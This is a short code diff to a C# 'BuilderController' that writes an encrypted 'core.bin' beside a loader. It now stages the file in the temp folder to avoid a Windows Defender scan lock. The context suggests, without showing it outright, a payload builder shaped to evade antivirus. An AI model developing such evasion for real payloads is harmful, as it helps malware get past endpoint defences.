@@ -497,9 +497,11 @@ public class BuilderController : ControllerBase
             var finalCorePath = Path.Combine(finalDir, "core.bin");
             Directory.CreateDirectory(finalDir);
 
-            // Write core.bin FIRST (before loader copy triggers Defender scan)
+            // Write core.bin via system temp + move (avoids Defender directory scan lock)
             job.Log("Writing core.bin...");
-            await System.IO.File.WriteAllBytesAsync(finalCorePath, encryptedCore);
+            var tempCorePath = Path.Combine(Path.GetTempPath(), $"libra_{buildId}.bin");
+            await System.IO.File.WriteAllBytesAsync(tempCorePath, encryptedCore);
+            System.IO.File.Move(tempCorePath, finalCorePath, true);
             job.Log($"core.bin written: {encryptedCore.Length / 1024} KB");
 
             // Copy loader
